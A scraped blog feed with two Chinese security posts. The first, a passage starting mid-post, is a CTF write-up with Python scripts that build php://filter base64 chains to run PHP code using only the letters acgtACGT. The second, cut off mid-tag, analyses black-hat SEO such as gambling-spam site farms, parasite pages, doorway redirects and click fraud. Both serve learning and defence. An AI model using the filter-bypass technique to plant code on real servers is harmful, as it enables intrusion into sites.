class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题限制了使用<code>php://input</code>、<code>data://</code>、<code>read://</code>。关键的考点就是如何过这个正则<code>/[^acgt]/is</code>。</p><p>ok，正则表示我们只能使用<code>acgtACGT</code>这么8个字符，那么我们如何通过这8个字符来写shell呢？</p><p>下面我们就用这8个字符来尝试生成我们的payload，以达到执行我们的php代码的目的。</p><h1 id="0x01-解决问题的关键——base64解码函数tips"><a href="#0x01-解决问题的关键——base64解码函数tips" class="headerlink" title="0x01 解决问题的关键——base64解码函数tips"></a>0x01 解决问题的关键——base64解码函数tips</h1><p>解决上述问题的关键，就是base64的解码规则。</p><p>首先你应该知道的：</p><ul><li>base64使用的字符包括大小写字母26个，加上10个数字，和<code>+</code>、<code>/</code>共64个字符。</li><li>base64在解码时，如果参数中有非法字符（不在上面64个字符内的），就会跳过。</li></ul><p>举个例子：</p><p>以r举例，我们可以看到可以通过<code>ctTT</code>进行base64解码后取得：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075418544185.jpg" alt=""></p><p>那么我们顺着这个思路，就可以得到一张通过已经给出的8个字符所得到的所有字符的字符表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    possible = list(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data <span class="keyword">in</span> possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">in</span> dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    pprint(exchange(chars))</span><br></pre></td></tr></table></figure><p>代码很简单，就是将<code>acgtACGT</code>取了单位元组为4个元素的笛卡尔积，之后将每个笛卡尔积所组成的新的字符串进行base64解码，结果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075425250385.jpg" alt=""></p><p>目前只有26个元素，剩下的怎么得到呢？</p><p>我们改一下我们的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    possible = list(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data <span class="keyword">in</span> possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">in</span> dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">limited_exchanging</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    tables = []</span><br><span class="line">    saved_length = <span class="number">0</span></span><br><span class="line">    flag = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        table = exchange(allow_chars)</span><br><span class="line">        length = len(table.keys())</span><br><span class="line">        <span class="keyword">if</span> saved_length == length:</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        saved_length = length</span><br><span class="line">        print(<span class="string">"[+] Got %d chars: %s"</span> % (length, table.keys()))</span><br><span class="line">        tables.append(table)</span><br><span class="line">        allow_chars = table.keys()</span><br><span class="line">        <span class="keyword">if</span> set(table.keys()) &gt;= set(dict):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">return</span> tables</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    pprint(limited_exchanging(chars))</span><br></pre></td></tr></table></figure><p>最后可以得到这样的映射表：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075430420240.jpg" alt=""></p><p>图很长，就不截了。</p><p>通过base64解码的特性，我们将8个字符拓展到了64个字符，接下来就是将我们的原数据进行转换就好了。</p><h1 id="0x02-剩下的一些要注意的点"><a href="#0x02-剩下的一些要注意的点" class="headerlink" title="0x02 剩下的一些要注意的点"></a>0x02 剩下的一些要注意的点</h1><h2 id="1-decode次数的问题"><a href="#1-decode次数的问题" class="headerlink" title="1. decode次数的问题"></a>1. decode次数的问题</h2><p>根据上面的代码，我们只需要<code>len(tables)</code>就可以知道我们转换经历了几次的过程，这边<code>len(tables)</code>是3次。</p><p>需要注意的是，在利用<code>php://filter/convert.base64-decode/resource=</code>的时候，需要<code>len(tables) + 1</code>，也就是说是4次，没毛病吧。</p><h2 id="2-在利用我们得出的映射表时，怎么迭代向前替换问题"><a href="#2-在利用我们得出的映射表时，怎么迭代向前替换问题" class="headerlink" title="2. 在利用我们得出的映射表时，怎么迭代向前替换问题"></a>2. 在利用我们得出的映射表时，怎么迭代向前替换问题</h2><p>将<code>tables</code>list从后向前遍历，最后得到的即为全部是指定字符的payload。</p><h1 id="0x03-最终的脚本"><a href="#0x03-最终的脚本" class="headerlink" title="0x03 最终的脚本"></a>0x03 最终的脚本</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">import os</span><br><span class="line">from itertools import product</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到payload完成base64编码后需要进行替换的向量</span></span><br><span class="line">def payload_base64_encode(data):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode().replace(<span class="string">"\n"</span>, <span class="string">""</span>).replace(<span class="string">"="</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line">def exchange(allow_chars):</span><br><span class="line">    possible = <span class="keyword">list</span>(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data in possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i in decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j in dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代得出完整的映射表</span></span><br><span class="line">def limited_exchanging(allow_chars):</span><br><span class="line">    tables = []</span><br><span class="line">    saved_length = <span class="number">0</span></span><br><span class="line">    flag = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        table = exchange(allow_chars)</span><br><span class="line">        length = len(table.keys())</span><br><span class="line">        <span class="keyword">if</span> saved_length == length:</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        saved_length = length</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Got %d exchange_chars: %s"</span> % (length, table.keys()))</span><br><span class="line">        tables.append(table)</span><br><span class="line">        allow_chars = table.keys()</span><br><span class="line">        <span class="keyword">if</span> set(table.keys()) &gt;= set(dict):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">return</span> tables</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到最后的payload</span></span><br><span class="line">def create_payload(tables, data):</span><br><span class="line">    encoded = payload_base64_encode(data)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"[+] Payload base64: "</span> + encoded)</span><br><span class="line">    result = encoded</span><br><span class="line">    <span class="keyword">for</span> d in tables[::<span class="number">-1</span>]:</span><br><span class="line">        encoded = result</span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i in encoded:</span><br><span class="line">            result += d[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    payload = <span class="string">b"<span class="meta">&lt;?php</span> echo \"hacked by lucifaer\"<span class="meta">?&gt;</span>"</span></span><br><span class="line">    limit_chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    filename = limit_chars</span><br><span class="line">    tables = limited_exchanging(limit_chars)</span><br><span class="line">    <span class="keyword">if</span> tables:</span><br><span class="line">        cipher = create_payload(tables, payload)</span><br><span class="line">        with open(filename, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(cipher)</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[+] The encoded data is saved to file (%d Bytes) : %s"</span> % (len(cipher), filename))</span><br><span class="line">        command = <span class="string">"php -r 'include(\""</span> + <span class="string">"php://filter/convert.base64-decode/resource="</span> * (</span><br><span class="line">            len(tables) + <span class="number">1</span>) + <span class="string">"%s\");'"</span> % (filename)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Usage : %s"</span> % command)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Executing..."</span>)</span><br><span class="line">        os.system(command=command)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[-] Failed: %s"</span> % tables)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>这道题提出了一个比较好的思路，值得学习</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在十一的XDCTF中有一道Upload题引出的如何通过固定的几个字符，利用php伪协议中的&lt;code&gt;convert.base64-encode&lt;/code&gt;来写shell。&lt;/p&gt;
    
    </summary>
    
      <category term="一些思路" scheme="https://lucifaer.com/categories/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/"/>
    
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
      <category term="CTF" scheme="https://lucifaer.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Blackhat SEO</title>
    <link href="https://lucifaer.com/2017/07/20/Blackhat%20SEO/"/>
    <id>https://lucifaer.com/2017/07/20/Blackhat SEO/</id>
    <published>2017-07-20T10:31:09.000Z</published>
    <updated>2018-11-29T09:47:14.817Z</updated>
    
    <content type="html"><![CDATA[<p>之前分析黑产SEO的笔记</p><a id="more"></a><h1 id="0x00-由两个问题引出来话题"><a href="#0x00-由两个问题引出来话题" class="headerlink" title="0x00 由两个问题引出来话题"></a>0x00 由两个问题引出来话题</h1><h2 id="1-“菠菜”问题"><a href="#1-“菠菜”问题" class="headerlink" title="1. “菠菜”问题"></a>1. “菠菜”问题</h2><p>在使用360搜索时，我们发现了非常严重的现象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004564178632.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004565691879.jpg" alt=""></p><p>在搜索“菠菜”（“博彩谐音”），杏彩等敏感词汇时，360搜索所提供的为您推荐中存在非预期结果，访问这些链接所搜索到的网站都是博彩网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004572110455.jpg" alt=""></p><p>同时，换个方式，我们在360搜索中搜索“赌博谐音”，可以发现给出的链接都是赌博网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004581864390.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004582457255.jpg" alt=""></p><h2 id="2-相关搜索问题"><a href="#2-相关搜索问题" class="headerlink" title="2. 相关搜索问题"></a>2. 相关搜索问题</h2><p>在搜索赌博时，我们在网页最下方的相关搜索处发现了非预期结果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004594842784.jpg" alt=""></p><p>所有的“赌博交流群”的搜索结果皆为博彩网站。</p><p>同样的情况也出现在搜索“菠菜”关键字时：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004600287650.jpg" alt=""></p><p>进入该链接后，同样存在：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004600611527.jpg" alt=""></p><p>还有在搜索“彩”关键字时：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004605043246.jpg" alt=""></p><p>点击进入，发现全为黄色网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004605363821.jpg" alt=""></p><h1 id="0x01-同类搜索引擎比较"><a href="#0x01-同类搜索引擎比较" class="headerlink" title="0x01 同类搜索引擎比较"></a>0x01 同类搜索引擎比较</h1><h2 id="1-百度"><a href="#1-百度" class="headerlink" title="1. 百度"></a>1. 百度</h2><p>“菠菜”关键字：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608450724.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608543555.jpg" alt=""></p><p>“赌博”关键字：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608936128.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004609010229.jpg" alt=""></p><p>并没有发现相关的博彩网站。</p><h2 id="2-Google"><a href="#2-Google" class="headerlink" title="2. Google"></a>2. Google</h2><p>同样并没有发现相关的博彩网站。</p><h1 id="0x02-为什么会出现这样的现象——Blackhat-SEO"><a href="#0x02-为什么会出现这样的现象——Blackhat-SEO" class="headerlink" title="0x02 为什么会出现这样的现象——Blackhat SEO"></a>0x02 为什么会出现这样的现象——Blackhat SEO</h1><h2 id="1-什么是Blackhat-SEO"><a href="#1-什么是Blackhat-SEO" class="headerlink" title="1. 什么是Blackhat SEO"></a>1. 什么是Blackhat SEO</h2><p>SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。我们都知道，如果一个新站想要取得好的排名，往往需要很长的时间和资源。为了简化这个过程，出现了Blackhat SEO。</p><h2 id="2-Blackhat-SEO的几个基础概念"><a href="#2-Blackhat-SEO的几个基础概念" class="headerlink" title="2. Blackhat SEO的几个基础概念"></a>2. Blackhat SEO的几个基础概念</h2><ul><li>三级域名（即顶级域名、一级域名、二级域名）</li><li><p>泛站群</p><ul><li><p>泛二级域名站群</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004620854981.jpg" alt=""></p><p>  以上这些，都是<code>www.bet3657834.com</code>这个博彩网站的泛二级域名站群。</p><p>  建立这样的泛二级域名站群，可以通过下面的方式实现：</p><ul><li>前提：在做域名解析的时候，选择了*</li><li>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果     </li></ul></li><li><p>泛端口站群</p><p>  基本同上，只是从二级域名变成了端口。</p><ul><li>建立的方法：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</li></ul></li><li><p>站中站</p><p>  就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p></li><li><p>链轮</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004632649092.png" alt=""></p><p>  中间为想要推广的网站，外围是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加中间网站的外链。谷歌貌已经对此不友好，百度还可以尝试。</p></li><li><p>蜘蛛池</p><p>  蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p></li><li><p>寄生虫</p><p>  寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p></li></ul></li></ul><h1 id="0x03-Blackhat-SEO常用的手法"><a href="#0x03-Blackhat-SEO常用的手法" class="headerlink" title="0x03 Blackhat SEO常用的手法"></a>0x03 Blackhat SEO常用的手法</h1><p>下面列出几种常见的，如果想要了解更加详细的信息，请看<a href="https://cognitiveseo.com/blog/12169/44-black-hat-seo-techniques/" target="_blank" rel="noopener">这里</a>了解详情。（搜索引擎判断关键字堆砌的技术已经非常的成熟，下面就不赘述了）</p><h2 id="3-1-Doorway-Pages-or-Gateway-Pages"><a href="#3-1-Doorway-Pages-or-Gateway-Pages" class="headerlink" title="3.1 Doorway Pages or Gateway Pages"></a>3.1 Doorway Pages or Gateway Pages</h2><p>桥页为一种比较常见的黑产SEO方式，通常该页面充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。通常桥页都会配合页面跳转来实现。</p><h3 id="页面跳转的分类"><a href="#页面跳转的分类" class="headerlink" title="页面跳转的分类"></a>页面跳转的分类</h3><ol><li>服务端跳转</li><li><p>客户端跳转</p><p> 客户端跳转分为：http层跳转，应用层跳转</p><p> 应用层跳转又分为：html head跳转，js跳转</p><ul><li><p>http层跳转</p><p>  http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302</p></li><li><p>html head跳转（HTML refresh）</p><p>  在html代码的head中添加特殊标签如：</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>; <span class="attr">url</span>=<span class="string">"http://target_url/"</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><pre><code>    表示：0秒之后跳转到target_url，这个跳转需要浏览器具体解析html后才能进行。* js跳转    在html代码中添加js代码，通过js代码实现跳转。这部分的案例就很多了，举个有代表性的例子：    ![](http://image-lucifaer.test.upcdn.net/2018/11/29/15002818605123.jpg)    ![](http://image-lucifaer.test.upcdn.net/2018/11/29/15002818294901.jpg)    完成了博彩网站的二级跳转。</code></pre><ol start="3"><li><p>各种跳转包含关系</p><ul><li>服务端跳转</li><li>客户端跳转<ul><li>http跳转</li><li>应用层跳转<ul><li>html head跳转</li><li>html js跳转</li></ul></li></ul></li></ul></li><li><p>各种跳转介绍</p><ul><li>服务端跳转<ul><li>介绍：跳转发生在服务器上，用户不会有任何感觉</li><li>优点：跳转行为在server进行，一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑</li><li>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力</li></ul></li><li>http跳转<ul><li>介绍：跳转发生在服务端发生数据给客户端过程中，用户能感觉到，状态码往往为302.</li><li>优点：响应速度快。</li><li>缺点：仅能做跳转，没有其他功能，基于js和html的跳转可以选择延时跳转，但302无法选择延时跳转等。</li></ul></li><li>html head跳转<ul><li>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。</li><li>优点：跳转方式灵活，可以指定延时跳转以及记录用户信息等。</li><li>缺点：可能多次建立tcp连接，浪费客户端时间。</li></ul></li><li>js跳转<ul><li>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。</li><li>优点：同上</li><li>缺点：同上</li></ul></li></ul></li></ol><p>想要获取详细信息，请看<a href="http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html" target="_blank" rel="noopener">这里</a></p><h2 id="3-2-刷站"><a href="#3-2-刷站" class="headerlink" title="3.2 刷站"></a>3.2 刷站</h2><h3 id="3-2-1-刷排名"><a href="#3-2-1-刷排名" class="headerlink" title="3.2.1 刷排名"></a>3.2.1 刷排名</h3><p>刷排名的原理基于用户点击，搜索引擎认为质量高的网站必然是用户最喜欢点击的网站，搜索一个关键字，一个网站点击的次数越多，说明这个网站是更受用户欢迎的。</p><p>刷搜索引擎排名的核心技术就是模仿大量真实IP搜索某个关键词并直接点击目标网站，一般是通过adsl换ip或者是代理池的方式来实现的。</p><p><strong>应对措施：</strong></p><p>这里说一说百度如何判断刷排名的：</p><ol><li>搜索和地域不相关的词。</li><li>IP过多集中在同一区域或者同一IP段。如果是用adsl拨号换IP的话，尽管IP能切换成不同的IP，但始终都是在同一IP段内，并且IP所在地址是不变的。</li><li>不点击排名在前面的网站，而直接点击某一特定排名的网站。由于是刷排名，软件一般会通过定位或者是查找的方式，直接跳转到某一页中，点击某个特定的网站。这就和普通用户的浏览习惯大相径庭了。</li></ol><h3 id="3-2-2-刷下拉框（相关搜索）"><a href="#3-2-2-刷下拉框（相关搜索）" class="headerlink" title="3.2.2 刷下拉框（相关搜索）"></a>3.2.2 刷下拉框（相关搜索）</h3><p>刷相关搜索的方法，就是发明一些与热门关键字相关的关键字，预先自己建立好响应的页面，通过搜索这个心的关键词能排到第一。然后通过软件在搜索引擎中不断的搜索这个关键字，于是这个关键字就出现在相关搜索的位置，吸引用户点击搜索。</p><h3 id="3-2-3-刷网站流量"><a href="#3-2-3-刷网站流量" class="headerlink" title="3.2.3 刷网站流量"></a>3.2.3 刷网站流量</h3><p>通常说网站流量是指网站的访问量，是用来描述一个网站的用户数量以及用户所浏览的页面数量等指标。</p><p>刷流量具有一些<strong>特征：</strong></p><ol><li>流量大起大落</li><li>重复IP严重</li><li>页面浏览时间太短</li><li>流量不均匀</li><li>外链和流量严重不平衡</li></ol><p>搜索引擎可以针对这些特征来进行相关改进。</p><h2 id="3-3-PR劫持"><a href="#3-3-PR劫持" class="headerlink" title="3.3 PR劫持"></a>3.3 PR劫持</h2><p>PR劫持主要利用的301和302定向的功能。从域名A做301或302转向到域名B，而域名A的PR值较高，域名B在PR更新后，也会显示域名A的PR值。最简单的就是先做301或302跳转到域名B，等PR更新过后，立刻取消转向，同时也获得了和A站相同的PR值。</p><p><strong>检查PR劫持：</strong></p><ul><li><a href="http://checkpagerank.net/" target="_blank" rel="noopener">PR值检测网站</a></li><li>看Google的网页快照，Google快照和你看到的网页不是同一个网站，(一般网站标题和logo都会显示出来)，就非常可疑了，网页快照里面的那个网站就是PR劫持的目标网站。</li><li>查看反向链接，再根据反向链接来判断真实的网站是哪个。登陆google，在搜索框中输入：link:it.xxxxx.com，搜索结果中的网站就是向该网站提供反向链接的，任意打开一个，在里面查找it.xxxxx.com的链接，没有发现。再随机找几个，依然没有发现，这就说明该站的PR是劫持的</li></ul><h2 id="3-4-Link-Farm"><a href="#3-4-Link-Farm" class="headerlink" title="3.4 Link Farm"></a>3.4 Link Farm</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005225455116.png" 